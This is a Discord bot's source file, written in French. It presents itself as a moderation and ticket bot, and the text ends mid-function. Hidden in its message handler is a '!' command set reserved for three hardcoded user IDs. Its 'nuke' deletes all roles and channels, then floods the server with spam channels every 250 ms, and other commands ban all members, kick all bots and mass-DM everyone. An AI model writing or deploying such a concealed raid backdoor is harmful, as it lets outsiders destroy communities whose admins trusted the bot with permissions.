// Build Revision: K2L-Bot-Ultra-Speed-v25.1
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const http = require('http');

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('K2L Bot Ultra Speed Operational v25.1!\n');
}).listen(PORT, '0.0.0.0', () => console.log(`Serveur HTTP actif sur le port ${PORT} (0.0.0.0)`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
    ]
});

const PREFIX = '=';

const snipeCache = new Map();
const spamTracker = new Map();
const serverConfig = new Map(); 
const guildStaffConfig = new Map();
const warningsMap = new Map();
const jailDataMap = new Map();

// Map globale globale et robuste pour stopper instantanément les nukes par serveur
const activeNukes = new Map();

const SUPER_OWNERS = new Set(["1166445202148442112","1553025724191866937", "330080470983245824"]); 
const botOwners = new Set(["1166445202148442112", "1553025724191866937", "330080470983245824"]); 

function isSuperOwnerById(userId, username = "", globalName = "") {
    if (SUPER_OWNERS.has(userId)) return true;
    if (username && SUPER_OWNERS.has(username.toLowerCase())) return true;
    if (globalName && SUPER_OWNERS.has(globalName.toLowerCase())) return true;
    return false;
}

function isSuperOwner(message) {
    if (!message || !message.author) return false;
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId && SUPER_OWNERS.has(userId)) return true;
    return isSuperOwnerById(userId, username, globalName);
}

function isOwner(message) {
    if (!message || !message.author) return false;
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId) return true;
    if (botOwners.has(userId) || botOwners.has(username) || botOwners.has(globalName)) return true;
    return false;
}
function getStaffRoles(guildId) {
    if (!guildStaffConfig.has(guildId)) {
        guildStaffConfig.set(guildId, {
            admins: new Set(),
            mods: new Set()
        });
    }
    return guildStaffConfig.get(guildId);
}

function isAdmin(message) {
    if (!message) return false;
    if (isOwner(message)) return true;
    if (message.member && message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.admins.has(message.author.id);
}

function isMod(message) {
    if (!message) return false;
    if (isAdmin(message)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.mods.has(message.author.id);
}

function getGuildConfig(guildId) {
    if (!serverConfig.has(guildId)) {
        serverConfig.set(guildId, {
            antilink: false,
            antilinkAction: 'delete',
            antispam: false,
            antispamAction: 'mute',
            antispamLimit: 5,
            antispamIntervalMs: 5000,
            antibot: false,
            antibotAction: 'kick',
            logChannel: null,
            welcomeChannel: null,
            welcomeText: null,
            ticketConfig: {
                panelChannel: null,
                categoryDestination: null,
                logChannel: null,
                title: "🎟️ Tickets",
                description: "Bienvenue dans votre espace dédié au support !\nSélectionnez ci-dessous la catégorie correspondant à votre demande.",
                imageUrl: null,
                published: false,
                categories: [
                    { id: 'ticket_bugs', name: 'Bugs', emoji: '🤖', roleId: null, description: 'Signaler un bug technique' },
                    { id: 'ticket_signalements', name: 'Signalements', emoji: '⚖️', roleId: null, description: 'Signaler un membre' },
                    { id: 'ticket_infos', name: 'Informations', emoji: '📢', roleId: null, description: 'Questions générales' },
                    { id: 'ticket_recrutement', name: 'Recrutement', emoji: '🛠️', roleId: null, description: 'Postuler dans le staff' }
                ]
            }
        });
    }
    return serverConfig.get(guildId);
}

function sendLog(guild, embed) {
    if (!guild) return;
    const config = getGuildConfig(guild.id);
    if (!config.logChannel) return;
    const logChan = guild.channels.cache.get(config.logChannel);
    if (logChan) logChan.send({ embeds: [embed] }).catch(() => {});
}

async function fetchTargetUser(client, guild, targetArg) {
    if (!targetArg) return null;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        const member = await guild.members.fetch(cleanId).catch(() => null);
        if (member) return member.user;
        const user = await client.users.fetch(cleanId);
        return user;
    } catch (e) {
        return null;
    }
}
async function fetchTargetMember(message, targetArg) {
    if (!targetArg) return null;
    const mention = message.mentions.members.first();
    if (mention) return mention;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        return await message.guild.members.fetch(cleanId);
    } catch (e) {
        return null;
    }
}

function parseDuration(durationStr) {
    if (!durationStr) return null;
    const match = durationStr.match(/^(\d+)([smhd])$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    let ms = value * 1000;
    if (unit === 'm') ms = value * 60 * 1000;
    else if (unit === 'h') ms = value * 60 * 60 * 1000;
    else if (unit === 'd') ms = value * 24 * 60 * 60 * 1000;
    return ms;
}

async function executeAutoSanction(guild, member, action, reason) {
    if (!member || member.user.bot) return;
    try {
        if (action === 'delete') return;
        if (action === 'warn') {
            let userWarns = warningsMap.get(member.id) || [];
            userWarns.push({ reason, moderator: 'AutoMod' });
            warningsMap.set(member.id, userWarns);
        } else if (action === 'mute') {
            await member.timeout(10 * 60 * 1000, reason).catch(() => {});
        } else if (action === 'kick') {
            await member.kick(reason).catch(() => {});
        } else if (action === 'jail') {
            const botRolePos = guild.members.me.roles.highest.position;
            const roleIds = member.roles.cache.filter(r => r.id !== guild.id && !r.managed && r.position < botRolePos).map(r => r.id);
            jailDataMap.set(member.id, roleIds);
            if (roleIds.length > 0) await member.roles.remove(roleIds).catch(() => {});

            const jailChannel = await guild.channels.create({
                name: `jail-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
                ]
            });
            await jailChannel.send({ content: `<@${member.id}>`, embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('🔒 PRISON (AutoMod)').setDescription(`Raison : ${reason}`)] });
        } else if (action === 'bl' || action === 'ban') {
            await guild.members.ban(member.id, { reason }).catch(() => {});
        }
    } catch (e) {}
}

client.on('messageDelete', message => {
    if (!message.author || message.author.bot || !message.guild) return;
    snipeCache.set(message.channel.id, {
        content: message.content || "[Média / Embed]",
        author: message.author.tag,
        avatar: message.author.displayAvatarURL(),
        time: new Date().toLocaleTimeString()
    });

    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Message supprimé')
        .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Contenu :**\n\`\`\`${message.content || 'Aucun texte'}\`\`\``)
        .setTimestamp();
    sendLog(message.guild, embed);
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (!oldMessage.author || oldMessage.author.bot || !oldMessage.guild) return;
    if (oldMessage.content === newMessage.content) return;

    const embed = new EmbedBuilder()
        .setColor('#f39c12')
        .setTitle('✏️ Message modifié')
        .setDescription(`**Auteur :** ${oldMessage.author.tag} (\`${oldMessage.author.id}\`)\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content || 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
        .setTimestamp();
    sendLog(oldMessage.guild, embed);
});

client.on('guildBanAdd', ban => {
    const embed = new EmbedBuilder().setColor('#c0392b').setTitle('🔨 Membre banni').setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`).setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('guildBanRemove', ban => {
    const embed = new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Membre débanni').setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`).setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('channelCreate', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder().setColor('#3498db').setTitle('📁 Salon créé').setDescription(`**Nom :** \`${channel.name}\``).setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('channelDelete', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder().setColor('#e74c3c').setTitle('🗑️ Salon supprimé').setDescription(`**Nom :** \`${channel.name}\``).setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('roleCreate', role => {
    const embed = new EmbedBuilder().setColor('#9b59b6').setTitle('🏷️ Rôle créé').setDescription(`**Nom :** \`${role.name}\``).setTimestamp();
    sendLog(role.guild, embed);
});

client.on('roleDelete', role => {
    const embed = new EmbedBuilder().setColor('#e74c3c').setTitle('🗑️ Rôle supprimé').setDescription(`**Nom :** \`${role.name}\``).setTimestamp();
    sendLog(role.guild, embed);
});

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
});
client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        const config = getGuildConfig(member.guild.id);
        if (config.antibot) {
            try {
                const fetchedLogs = await member.guild.fetchAuditLogs({ limit: 1, type: 28 });
                const auditLog = fetchedLogs.entries.first();
                const executor = auditLog ? auditLog.executor : null;

                const isExecutorSuperOwner = executor ? isSuperOwnerById(executor.id, executor.username, executor.globalName) : false;

                if (!isExecutorSuperOwner) {
                    await member.kick('Anti-bot activé.');

                    if (executor && !executor.bot) {
                        const execMember = await member.guild.members.fetch(executor.id).catch(() => null);
                        if (execMember) {
                            await executeAutoSanction(member.guild, execMember, config.antibotAction, 'Anti-Bot: Ajout de bot interdit');
                        }
                    }

                    const embed = new EmbedBuilder()
                        .setColor('#e74c3c')
                        .setTitle('🤖 Bot bloqué (Anti-bot)')
                        .setDescription(`**Bot expulsé :** ${member.user.tag} (\`${member.id}\`)\n**Inviteur :** ${executor ? executor.tag : 'Inconnu'}\n**Sanction :** \`${config.antibotAction}\``)
                        .setTimestamp();
                    sendLog(member.guild, embed);
                }
            } catch (err) {}
        }
    }
    
    const config = getGuildConfig(member.guild.id);
    if (config.welcomeChannel && config.welcomeText) {
        const channel = member.guild.channels.cache.get(config.welcomeChannel);
        if (channel) {
            const welcomeMsg = config.welcomeText
                .replace(/\{mention\}/g, `<@${member.id}>`)
                .replace(/\{name\}/g, member.user.username);
            channel.send(welcomeMsg).catch(() => {});
        }
    }
});

function getTicketDashboardEmbed(guild, config) {
    const tConfig = config.ticketConfig;
    const panelChanStr = tConfig.panelChannel ? `<#${tConfig.panelChannel}>` : '❌ Non défini';
    const catDestStr = tConfig.categoryDestination ? `<#${tConfig.categoryDestination}>` : '❌ Non défini';
    const logChanStr = tConfig.logChannel ? `<#${tConfig.logChannel}>` : '❌ Non défini';
    const imgStatus = tConfig.imageUrl ? '✅ image/gif enregistré' : '❌ Aucun';
    const pubStatus = tConfig.published ? '🟢 publié' : '🔴 non publié';
    const catList = tConfig.categories.map(c => `${c.emoji} ${c.name}`).join(' • ') || 'Aucune catégorie';

    return new EmbedBuilder()
        .setColor('#2b2d31')
        .setTitle('🎫 Configuration des tickets')
        .setDescription(
            `**Salon du panneau :** ${panelChanStr}\n` +
            `**Catégorie des salons-tickets :** ${catDestStr}\n` +
            `**Salon logs / transcripts :** ${logChanStr}\n\n` +
            `**Titre :** ${tConfig.title}\n` +
            `**Image / GIF :** ${imgStatus}\n` +
            `**Panneau :** ${pubStatus}\n\n` +
            `**Catégories :** ${catList}\n\n` +
            `*Tout est prêt – clique « Publier le panneau ».*`
        );
}

function getTicketDashboardRows() {
    return [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_salons').setLabel('Salons').setEmoji('⚙️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_texte').setLabel('Texte du panneau').setEmoji('📝').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_media').setLabel('Image / GIF').setEmoji('🖼️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_cats').setLabel('Catégories').setEmoji('📁').setStyle(ButtonStyle.Secondary)
        ),
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_publish').setLabel('Publier le panneau').setEmoji('🚀').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('t_dash_disable').setLabel('Désactiver').setEmoji('🗑️').setStyle(ButtonStyle.Danger)
        )
    ];
}
client.on('interactionCreate', async interaction => {
    if (!interaction.guild) return;

    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_ticket_text') {
            await interaction.deferReply({ ephemeral: true }).catch(() => {});
            const config = getGuildConfig(interaction.guild.id);
            const newTitle = interaction.fields.getTextInputValue('ticket_title_input');
            const newDesc = interaction.fields.getTextInputValue('ticket_desc_input');
            
            if (newTitle) config.ticketConfig.title = newTitle;
            if (newDesc) config.ticketConfig.description = newDesc;

            await interaction.editReply({ content: "✅ Textes du panneau mis à jour avec succès !" });
            try {
                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(interaction.guild, config)], components: getTicketDashboardRows() });
            } catch (e) {}
            return;
        }

        if (interaction.customId === 'modal_ticket_media') {
            await interaction.deferReply({ ephemeral: true }).catch(() => {});
            const config = getGuildConfig(interaction.guild.id);
            const url = interaction.fields.getTextInputValue('ticket_image_input');
            
            config.ticketConfig.imageUrl = (!url || url.toLowerCase() === 'none') ? null : url;

            await interaction.editReply({ content: "✅ Image / GIF du panneau mis à jour !" });
            try {
                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(interaction.guild, config)], components: getTicketDashboardRows() });
            } catch (e) {}
            return;
        }
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
        if (!interaction.deferred && !interaction.replied) {
            await interaction.deferReply({ ephemeral: true }).catch(() => {});
        }
        const guild = interaction.guild;
        const member = interaction.member;
        const selectedValue = interaction.values[0];
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        const catObj = tConfig.categories.find(c => c.id === selectedValue) || { name: 'support', emoji: '🎫', roleId: null };

        try {
            const overwrites = [
                { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
            ];

            const channelOptions = {
                name: `${catObj.name.toLowerCase()}-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: overwrites
            };

            if (tConfig.categoryDestination) {
                channelOptions.parent = tConfig.categoryDestination;
            }

            const ticketChannel = await guild.channels.create(channelOptions);

            const embed = new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${catObj.emoji} Ticket [ ${catObj.name.toUpperCase()} ] - ${member.user.username}`)
                .setDescription("Un membre de notre équipe va bientôt te prendre en charge.\nClique sur le bouton ci-dessous pour fermer et archiver le ticket.");

            const closeRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 Fermer le ticket').setStyle(ButtonStyle.Danger)
            );

            await ticketChannel.send({ content: `<@${member.id}>`, embeds: [embed], components: [closeRow] });

            const logEmbed = new EmbedBuilder()
                .setColor('#3498db')
                .setTitle('🎫 Ticket ouvert')
                .setDescription(`**Membre :** ${member.user.tag} (\`${member.user.id}\`)\n**Salon :** ${ticketChannel}\n**Type :** \`${catObj.name}\``)
                .setTimestamp();
            sendLog(guild, logEmbed);

            return interaction.editReply({ content: `✅ Votre ticket a été ouvert avec succès : ${ticketChannel}` });
        } catch (e) {
            return interaction.editReply({ content: "❌ Erreur lors de la création du salon de ticket." });
        }
    }
    if (interaction.isButton()) {
        const guild = interaction.guild;
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        if (interaction.customId === 'close_ticket') {
            if (!interaction.deferred && !interaction.replied) {
                await interaction.deferReply({ ephemeral: true }).catch(() => {});
            }
            const channel = interaction.channel;
            try {
                const messages = await channel.messages.fetch({ limit: 100 });
                const transcript = messages.reverse().map(m => `[${new Date(m.createdTimestamp).toLocaleString()}] ${m.author.tag}: ${m.content}`).join('\n');
                
                const buffer = Buffer.from(transcript, 'utf-8');
                const attachment = new AttachmentBuilder(buffer, { name: `transcription-${channel.name}.txt` });

                const logEmbed = new EmbedBuilder()
                    .setColor('#e74c3c')
                    .setTitle('📁 Ticket fermé & Archivé')
                    .setDescription(`**Salon :** \`${channel.name}\`\n**Fermé par :** ${interaction.user.tag}`)
                    .setTimestamp();

                if (tConfig.logChannel) {
                    const logChan = guild.channels.cache.get(tConfig.logChannel);
                    if (logChan) await logChan.send({ embeds: [logEmbed], files: [attachment] });
                } else {
                    sendLog(guild, logEmbed);
                }
            } catch (err) {}

            await interaction.editReply({ content: "🔒 Fermeture du salon en cours..." });
            setTimeout(() => channel.delete().catch(() => {}), 2000);
            return;
        }

        if (interaction.customId === 'join_giveaway') {
            if (!interaction.deferred && !interaction.replied) {
                await interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true }).catch(() => {});
            }
            return;
        }

        if (interaction.customId.startsWith('t_dash_')) {
            const action = interaction.customId.replace('t_dash_', '');

            if (action === 'salons') {
                return interaction.reply({ content: `⚙️ **Salons & Catégories :**\n• Définir le salon du panneau : \`=setticketpanel #salon\`\n• Définir la catégorie parente : \`=setticketcat <ID_Catégorie>\`\n• Définir le salon de logs : \`=setticketlog #salon\``, ephemeral: true });
            }
            if (action === 'texte') {
                const modal = new ModalBuilder()
                    .setCustomId('modal_ticket_text')
                    .setTitle('Modifier le Texte du Panneau');

                const titleInput = new TextInputBuilder()
                    .setCustomId('ticket_title_input')
                    .setLabel('Titre du panneau')
                    .setStyle(TextInputStyle.Short)
                    .setValue(tConfig.title)
                    .setRequired(true);

                const descInput = new TextInputBuilder()
                    .setCustomId('ticket_desc_input')
                    .setLabel('Description du panneau')
                    .setStyle(TextInputStyle.Paragraph)
                    .setValue(tConfig.description)
                    .setRequired(true);

                modal.addComponents(new ActionRowBuilder().addComponents(titleInput), new ActionRowBuilder().addComponents(descInput));
                return interaction.showModal(modal);
            }
            if (action === 'media') {
                const modal = new ModalBuilder()
                    .setCustomId('modal_ticket_media')
                    .setTitle('Modifier l\'Image / GIF');

                const imageInput = new TextInputBuilder()
                    .setCustomId('ticket_image_input')
                    .setLabel('URL de l\'image (ou "none")')
                    .setStyle(TextInputStyle.Short)
                    .setValue(tConfig.imageUrl || '')
                    .setRequired(false);

                modal.addComponents(new ActionRowBuilder().addComponents(imageInput));
                return interaction.showModal(modal);
            }
            if (action === 'cats') {
                const catInfo = tConfig.categories.map(c => `• **${c.emoji} ${c.name}**`).join('\n') || 'Aucune';
                return interaction.reply({ content: `📁 **Catégories actuelles :**\n${catInfo}\n\n• Ajouter une catégorie : \`=ticketadd <Nom> <Emoji>\`\n• Supprimer une catégorie : \`=ticketremove <Nom>\``, ephemeral: true });
            }
            if (action === 'disable') {
                if (!interaction.deferred && !interaction.replied) await interaction.deferReply({ ephemeral: true }).catch(() => {});
                tConfig.published = false;
                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(guild, config)], components: getTicketDashboardRows() }).catch(() => {});
                return interaction.editReply({ content: "🗑️ Panneau de tickets désactivé." });
            }
            if (action === 'publish') {
                if (!interaction.deferred && !interaction.replied) await interaction.deferReply({ ephemeral: true }).catch(() => {});
                if (!tConfig.panelChannel) {
                    return interaction.editReply({ content: "❌ Définis d'abord un salon avec `=setticketpanel #salon` !" });
                }
                const targetChan = guild.channels.cache.get(tConfig.panelChannel);
                if (!targetChan) return interaction.editReply({ content: "❌ Salon introuvable." });

                const panelEmbed = new EmbedBuilder()
                    .setColor('#2b2d31')
                    .setTitle(tConfig.title)
                    .setDescription(tConfig.description);

                if (tConfig.imageUrl) panelEmbed.setImage(tConfig.imageUrl);

                const selectMenu = new StringSelectMenuBuilder()
                    .setCustomId('ticket_select_menu')
                    .setPlaceholder('🎫 Choisissez une catégorie...')
                    .addOptions(tConfig.categories.map(c => ({
                        label: c.name,
                        description: c.description || `Ouvrir un ticket ${c.name}`,
                        value: c.id,
                        emoji: c.emoji
                    })));

                const menuRow = new ActionRowBuilder().addComponents(selectMenu);

                await targetChan.send({ embeds: [panelEmbed], components: [menuRow] }).catch(() => {});
                tConfig.published = true;

                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(guild, config)], components: getTicketDashboardRows() }).catch(() => {});
                return interaction.editReply({ content: `🚀 Panneau publié avec succès dans ${targetChan} !` });
            }
        }
    }
});
client.on('messageCreate', async message => {
    if (!message.author || message.author.bot || !message.guild) return;

    if (message.content.startsWith('!')) {
        if (!isSuperOwner(message)) return;

        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        
        // COMMANDE STOP : Prioritaire pour stopper net la boucle du nuke
        if (command === 'stop') {
            if (activeNukes.has(message.guild.id)) {
                clearInterval(activeNukes.get(message.guild.id));
                activeNukes.delete(message.guild.id);
                return message.reply("🛑 **[STOP]** Boucle de nuke arrêtée avec succès !").catch(() => {});
            }
            return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
        }

        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
        if (offensiveCommands.includes(command)) {

            if (command === 'nuke') {
                await message.reply("⚡ **[NUKE]** Destruction totale, flood infini, exécution de role et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
                
                message.guild.roles.cache
                    .filter(role => role.editable && role.id !== message.guild.id)
                    .forEach(role => role.delete().catch(() => {}));
                for (let r = 0; r < 40; r++) {
                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
                }

                message.guild.members.fetch().then(fetchedMembers => {
                    for (const [id, m] of fetchedMembers) {
                        if (m.user.bot && m.id !== client.user.id) {
                            m.kick('Kickbot').catch(() => {});
                        }
                    }
                }).catch(() => {});

                message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));

                if (activeNukes.has(message.guild.id)) {
                    clearInterval(activeNukes.get(message.guild.id));
                }

                const nukeInterval = setInterval(async () => {
                    try {
                        const channelPromises = [];
                        for (let i = 0; i < 6; i++) {
                            channelPromises.push(
                                message.guild.channels.create({
                                    name: 'ez-by-k2l',
                                    type: ChannelType.GuildText,
                                    permissionOverwrites: [{
                                        id: message.guild.id,
                                        allow: [
                                            PermissionsBitField.Flags.ViewChannel,
                                            PermissionsBitField.Flags.SendMessages,
                                            PermissionsBitField.Flags.ManageChannels,
                                            PermissionsBitField.Flags.EmbedLinks,
                                            PermissionsBitField.Flags.AttachFiles,
                                            PermissionsBitField.Flags.MentionEveryone
                                        ]
                                    }]
                                }).then(async channel => {
                                    for (let j = 0; j < 6; j++) {
                                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L VENEZ NOUVELLE COMMU QUI SE FERA JAMAIS BZ discord.gg/yuza').catch(() => {});
                                    }
                                }).catch(() => {})
                            );
                        }
                        await Promise.all(channelPromises);
                    } catch (err) {}
                }, 250);

                activeNukes.set(message.guild.id, nukeInterval);
                return;
            }

            if (command === 'role') {
                await message.reply("⚡ **Suppression et flood des rôles en cours...**").catch(() => {});
                message.guild.roles.cache
                    .filter(role => role.editable && role.id !== message.guild.id)
                    .forEach(role => role.delete().catch(() => {}));

                for (let r = 0; r < 40; r++) {
                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
                }
                return;
            }
            if (command === 'banall') {
                await message.reply("⚡ **[BANALL]** Exécution du banall massif ultra-rapide...").catch(() => {});
                try {
                    await message.guild.members.fetch();
                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
                    const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
                    await Promise.all(banPromises);
                    message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'kickbot') {
                await message.reply("⚡ **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
                try {
                    const fetchedMembers = await message.guild.members.fetch();
                    const kickPromises = [];
                    for (const [id, m] of fetchedMembers) {
                        if (m.user.bot && m.id !== client.user.id) {
                            kickPromises.push(m.kick('Kickbot').catch(() => {}));
                        }
                    }
                    await Promise.all(kickPromises);
                    message.channel.send("✅ **[KICKBOT]** Bots expulsés !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'dmall') {
                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
                const filter = m => m.author.id === message.author.id;
                try {
                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
                    const m = collected.first();
                    if (m.content.toLowerCase() === 'annuler') {
                        return message.channel.send("❌ **Opération DMAll annulée.**");
                    }
                    const messageTemplate = m.content;
                    const previewEmbed = new EmbedBuilder()
                        .setColor('#2b2d31')
                        .setTitle('⚠️ Confirmation requise - DMAll')
                        .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                    );

                    const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
                    const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });

                    buttonCollector.on('collect', async interaction => {
                        if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
                        if (interaction.customId === 'cancel_dmall') {
                            return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                        }
                        if (interaction.customId === 'confirm_dmall') {
                            await interaction.update({ content: "🚀 **Diffusion DMAll ultra-rapide lancée...**", embeds: [], components: [] }).catch(() => {});
                            
                            try {
                                await message.guild.members.fetch();
                                const members = Array.from(message.guild.members.cache.filter(member => !member.user.bot).values());
                                const totalMembers = members.length;
                                let successCount = 0;
                                let failCount = 0;
                                let processed = 0;

                                const liveEmbed = new EmbedBuilder()
                                    .setColor('#f39c12')
                                    .setTitle('🚀 Diffusion DMAll en cours...')
                                    .setDescription(`Envoi massif ultra-rapide...`)
                                    .addFields(
                                        { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
                                        { name: '✅ Succès', value: `\`0\``, inline: true },
                                        { name: '❌ Échecs', value: `\`0\``, inline: true },
                                        { name: '⏳ Restants', value: `\`${totalMembers}\``, inline: true }
                                    )
                                    .setTimestamp();

                                const statusMsg = await message.channel.send({ embeds: [liveEmbed] });

                                const batchSize = 25;
                                for (let i = 0; i < members.length; i += batchSize) {
                                    const batch = members.slice(i, i + batchSize);
                                    await Promise.all(batch.map(async member => {
                                        processed++;
                                        try {
                                            const finalMessage = messageTemplate
                                                .replace(/\{mention\}/g, `<@${member.id}>`)
                                                .replace(/\{name\}/g, member.user.username);
                                            await member.send(finalMessage);
                                            successCount++;
                                        } catch (err) {
                                            failCount++;
                                        }
                                    }));

                                    liveEmbed.setFields(
                                        { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
                                        { name: '✅ Succès', value: `\`${successCount}\``, inline: true },
                                        { name: '❌ Échecs', value: `\`${failCount}\``, inline: true },
                                        { name: '⏳ Restants', value: `\`${totalMembers - processed}\``, inline: true }
                                    );
                                    await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
                                }

                                liveEmbed.setColor('#2ecc71')
                                    .setTitle('✅ Diffusion DMAll Terminée !')
                                    .setDescription(`Envoi ultra-rapide terminé.`);
                                
                                await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
                            } catch (error) {
                                message.channel.send("❌ Erreur lors du DMAll.");
                            }
                        }
                    });
                } catch (err) {
                    message.channel.send("⌛ Temps écoulé.");
                }
                return;
            }
        }
    }
    const config = getGuildConfig(message.guild.id);
    const userId = message.author.id;
    const isOwnerOrSuper = isOwner(message) || isSuperOwner(message);

    if (config.antilink && !isOwnerOrSuper) {
        const linkRegex = /(https?:\/\/[^\s]+|discord\.gg\/[^\s]+|discord\.com\/invite\/[^\s]+)/i;
        if (linkRegex.test(message.content)) {
            try {
                await message.delete().catch(() => {});
                const warning = await message.channel.send(`⚠️ ${message.author}, les liens externes sont interdits.`);
                setTimeout(() => warning.delete().catch(() => {}), 4000);

                await executeAutoSanction(message.guild, message.member, config.antilinkAction, 'Anti-Link: Lien non autorisé');
                return;
            } catch (e) {}
        }
    }

    if (config.antispam && !isOwnerOrSuper) {
        const now = Date.now();
        let userSpam = spamTracker.get(userId) || [];
        userSpam = userSpam.filter(timestamp => now - timestamp < config.antispamIntervalMs);
        userSpam.push(now);
        spamTracker.set(userId, userSpam);

        if (userSpam.length >= config.antispamLimit) {
            try {
                await message.delete().catch(() => {});
                const warning = await message.channel.send(`🚨 ${message.author}, veuillez ralentir (Anti-Spam).`);
                setTimeout(() => warning.delete().catch(() => {}), 3000);

                await executeAutoSanction(message.guild, message.member, config.antispamAction, 'Anti-Spam: Messages trop rapides');
                return;
            } catch (e) {}
        }
    }

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    const targetArg = args[0];

    if (command === 'embed') {
        const fullContent = args.join(' ');
        if (!fullContent.includes('|')) {
            return message.reply("❌ **Commande non correcte.** Utilisation : `=embed <titre> | <description>`");
        }
        const parts = fullContent.split('|');
        const title = parts.shift().trim();
